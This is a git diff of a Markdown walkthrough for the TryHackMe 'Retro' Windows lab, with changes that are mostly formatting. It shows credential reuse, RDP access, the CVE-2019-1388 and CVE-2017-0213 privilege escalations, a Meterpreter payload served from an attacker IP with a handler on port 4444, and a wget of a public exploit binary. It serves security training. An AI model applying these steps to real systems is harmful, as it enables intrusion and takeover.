@@ -1,20 +1,20 @@
 # Retro
 
-![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
+![tryhackme.com - © TryHackMe](<../../../../../.gitbook/assets/tryhackme-logo-small (2).png>)
 
----
+***
 
 ## Intro
 
-| Room Info           | ![](.gitbook/assets/retro.png)            |
-| :------------------ | ----------------------------------------- |
-| 🔗 Name              | [Retro](https://tryhackme.com/room/retro) |
-| 🎯 Target IP         | `10.10.181.110`                           |
-| 📈 Difficulty level  | 🟢Easy                                     |
-| 💲 Subscription type | Free                                      |
-| 🪟 OS                | Windows                                   |
+| Room Info            | ![](../../../../../.gitbook/assets/retro.png) |
+| -------------------- | --------------------------------------------- |
+| 🔗 Name              | [Retro](https://tryhackme.com/room/retro)     |
+| 🎯 Target IP         | `10.10.181.110`                               |
+| 📈 Difficulty level  | 🟢Easy                                        |
+| 💲 Subscription type | Free                                          |
+| 🪟 OS                | Windows                                       |
 
----
+***
 
 ## Recon
 
@@ -66,21 +66,21 @@ The enumeration found a folder named **`/retro`**.
 
 Use a browser to navigate to:
 
-- `http://10.10.181.110/retro/index.php/2019/12/09/ready-player-one/`
+* `http://10.10.181.110/retro/index.php/2019/12/09/ready-player-one/`
 
 > 📌 Wade user left a comment with his password
 
-![](.gitbook/assets/image-20230513140001737.png)
+![](../../../../../.gitbook/assets/image-20230513140001737.png)
 
 Use the credentials to login to the target via the open RDP Port `3389`
 
-- `Wade`:`parzival`
+* `Wade`:`parzival`
 
 > I suggest to set the `Remmina` RDP resolution to a higher one, **`e.g`**
 >
-> - Open Remmina, `+` to create a Quick RDP Connect, select the resolution and `Save as Default`
+> * Open Remmina, `+` to create a Quick RDP Connect, select the resolution and `Save as Default`
 >
-> ![](.gitbook/assets/image-20230513142438083.png)
+> <img src="../../../../../.gitbook/assets/image-20230513142438083.png" alt="" data-size="original">
 
 ```bash
 remmina -c rdp://wade@10.10.181.110
@@ -88,14 +88,14 @@ remmina -c rdp://wade@10.10.181.110
 # It will open with the default set up resolution
 ```
 
--  🚩 Open the **`user.txt`** file on Wade's user desktop to get the first flag.
+* 🚩 Open the **`user.txt`** file on Wade's user desktop to get the first flag.
 
 ```bash
 3b99f***************************
 
 ```
 
----
+***
 
 ## Exploitation
 
@@ -103,23 +103,23 @@ Open `Internet Explorer` to initialize it.
 
 Open `Google Chrome` and set it as **Default web browser** in Windows.
 
-![](.gitbook/assets/image-20230513142712637.png)
+![](../../../../../.gitbook/assets/image-20230513142712637.png)
 
 The bookmarked link refers to the [CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) - Windows Certificate Dialog Elevation of Privilege Vulnerability.
 
 Check the Recycle Bin and restore the `hhupd` file.
 
-![](.gitbook/assets/image-20230513140747457.png)
+![](../../../../../.gitbook/assets/image-20230513140747457.png)
 
 Exploit the privesc vulnerability present in the Windows Certificate Dialog Box and run `cmd` with **Administrator** privileges.
 
-![](.gitbook/assets/image-20230513141237572.png)
+![](../../../../../.gitbook/assets/image-20230513141237572.png)
 
-![](.gitbook/assets/image-20230513141306088.png)
+![](../../../../../.gitbook/assets/image-20230513141306088.png)
 
-- Even after the initialization of both the IE and Chrome browsers, there might not be any option for selecting the browser in the opened window.
+* Even after the initialization of both the IE and Chrome browsers, there might not be any option for selecting the browser in the opened window.
 
-![](.gitbook/assets/image-20230513152711279.png)
+![](../../../../../.gitbook/assets/image-20230513152711279.png)
 
 ### Meterpreter
 
@@ -136,7 +136,7 @@ python -m http.server 80
 
 Download the payload on the target browser from this link
 
-- `http://10.18.65.48/unprivileged-payload.exe`
+* `http://10.18.65.48/unprivileged-payload.exe`
 
 Open Metasploit and set up a handler to listen on the `4444` port
 
@@ -155,7 +155,7 @@ run
 
 Run the `unprivileged-payload.exe` file on the target machine
 
-![Wade Privileges Meterpreter](.gitbook/assets/image-20230513160120206.png)
+![Wade Privileges Meterpreter](../../../../../.gitbook/assets/image-20230513160120206.png)
 
 Get `systeminfo` from the target and save the output to a file.
 
@@ -164,15 +164,15 @@ shell
 systeminfo
 ```
 
-![](.gitbook/assets/image-20230513170606987.png)
+![](../../../../../.gitbook/assets/image-20230513170606987.png)
 
----
+***
 
 ## Privilege Escalation
 
 Exploit the [CVE-2017-0213 - Windows COM Elevation of Privilege Vulnerability](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213)
 
-- Download the `CVE-2017-0213_x64.zip` package, unzip it and upload the **`CVE-2017-0213_x86.exe`** to the target.
+* Download the `CVE-2017-0213_x64.zip` package, unzip it and upload the **`CVE-2017-0213_x86.exe`** to the target.
 
 ```bash
 wget https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/2b944b52ee30f8833a21f0805d2627ca1f15383a/CVE-2017-0213/CVE-2017-0213_x86.zip
@@ -190,11 +190,11 @@ shell
 .\CVE-2017-0213_x86.exe
 ```
 
-- Check the `CMD` as Administrator session on the target.
+* Check the `CMD` as Administrator session on the target.
 
-![Elevated CMD Session](.gitbook/assets/image-20230513171909558.png)
+![Elevated CMD Session](../../../../../.gitbook/assets/image-20230513171909558.png)
 
-- 🚩 Read the `root.txt` file
+* 🚩 Read the `root.txt` file
 
 ```bash
 cd c:\Users\Administrator\Desktop
@@ -202,9 +202,8 @@ type root.txt
 7958b***************************
 ```
 
-![](.gitbook/assets/2024-10-20_22-28-24_764.png)
+![](../../../../../.gitbook/assets/2024-10-20_22-28-24_764.png)
 
-- Remember that there can be other attack vectors to exploit target's vulnerabilities.
+* Remember that there can be other attack vectors to exploit target's vulnerabilities.
 
-------
-
+***
